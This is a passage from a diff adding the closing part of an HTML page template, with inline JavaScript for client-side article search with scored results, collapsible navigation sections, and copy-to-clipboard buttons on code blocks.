+
+          var excerptText = getExcerpt(item, terms);
+          if (excerptText) {
+            var excerpt = document.createElement("span");
+            excerpt.className = "site-search-excerpt";
+            excerpt.textContent = excerptText;
+            link.appendChild(excerpt);
+          }
+
+          return link;
+        }
+
+        function renderResults(query) {
+          var terms = normalize(query).trim().split(/\s+/).filter(Boolean);
+
+          if (!terms.length) {
+            clearResults();
+            return;
+          }
+
+          var matches = index.reduce(function (items, item) {
+            var matched = terms.every(function (term) {
+              return item._haystack.indexOf(term) >= 0;
+            });
+
+            if (!matched) {
+              return items;
+            }
+
+            var score = terms.reduce(function (total, term) {
+              if (item._title.indexOf(term) >= 0) {
+                total += 8;
+              }
+
+              if (item._summary.indexOf(term) >= 0) {
+                total += 4;
+              }
+
+              if (item._content.indexOf(term) >= 0) {
+                total += 1;
+              }
+
+              return total;
+            }, 0);
+
+            items.push({ item: item, score: score });
+            return items;
+          }, []);
+
+          matches.sort(function (a, b) {
+            return b.score - a.score || String(a.item.title).localeCompare(String(b.item.title), "zh-Hans-CN");
+          });
+
+          resultsBox.innerHTML = "";
+
+          if (!matches.length) {
+            var empty = document.createElement("div");
+            empty.className = "site-search-empty";
+            empty.textContent = "没有找到相关文章";
+            resultsBox.appendChild(empty);
+          } else {
+            var status = document.createElement("div");
+            status.className = "site-search-status";
+            status.textContent = "找到 " + matches.length + " 篇文章";
+            resultsBox.appendChild(status);
+
+            matches.slice(0, 8).forEach(function (match) {
+              resultsBox.appendChild(createResult(match.item, terms));
+            });
+          }
+
+          resultsBox.hidden = false;
+          input.setAttribute("aria-expanded", "true");
+        }
+
+        input.addEventListener("input", function () {
+          renderResults(input.value);
+        });
+
+        input.addEventListener("focus", function () {
+          renderResults(input.value);
+        });
+
+        input.addEventListener("keydown", function (event) {
+          if (event.key === "Escape") {
+            clearResults();
+            input.blur();
+            return;
+          }
+
+          if (event.key === "Enter") {
+            var firstResult = resultsBox.querySelector(".site-search-result");
+            if (firstResult && input.value.trim()) {
+              window.location.href = firstResult.href;
+            }
+          }
+        });
+
+        document.addEventListener("click", function (event) {
+          if (!root.contains(event.target)) {
+            clearResults();
+          }
+        });
+      })();
+
+      document.addEventListener("click", function (event) {
+        var toggle = event.target.closest(".tree-toggle");
+        if (!toggle) {
+          return;
+        }
+
+        var branch = document.getElementById(toggle.getAttribute("aria-controls"));
+        var item = toggle.closest(".is-section");
+        if (!branch || !item) {
+          return;
+        }
+
+        var isOpen = toggle.getAttribute("aria-expanded") === "true";
+        toggle.setAttribute("aria-expanded", String(!isOpen));
+        branch.hidden = isOpen;
+        item.classList.toggle("is-open", !isOpen);
+      });
+
+      document.querySelectorAll(".article > pre").forEach(function (pre) {
+        if (pre.parentElement && pre.parentElement.classList.contains("code-block")) {
+          return;
+        }
+
+        var wrapper = document.createElement("div");
+        wrapper.className = "code-block";
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+      });
+
+      document.querySelectorAll(".article .highlight, .article .code-block").forEach(function (block) {
+        var pre = block.matches("pre") ? block : block.querySelector("pre");
+        if (!pre || block.querySelector(".code-copy")) {
+          return;
+        }
+
+        var button = document.createElement("button");
+        button.className = "code-copy";
+        button.type = "button";
+        button.textContent = "复制";
+        button.setAttribute("aria-label", "复制代码");
+
+        button.addEventListener("click", function () {
+          var code = pre.querySelector("code") || pre;
+          navigator.clipboard.writeText(code.innerText).then(function () {
+            button.textContent = "已复制";
+            button.classList.add("is-copied");
+            window.setTimeout(function () {
+              button.textContent = "复制";
+              button.classList.remove("is-copied");
+            }, 1400);
+          });
+        });
+
+        block.appendChild(button);
+      });
+    </script>
+  </body>
+</html>
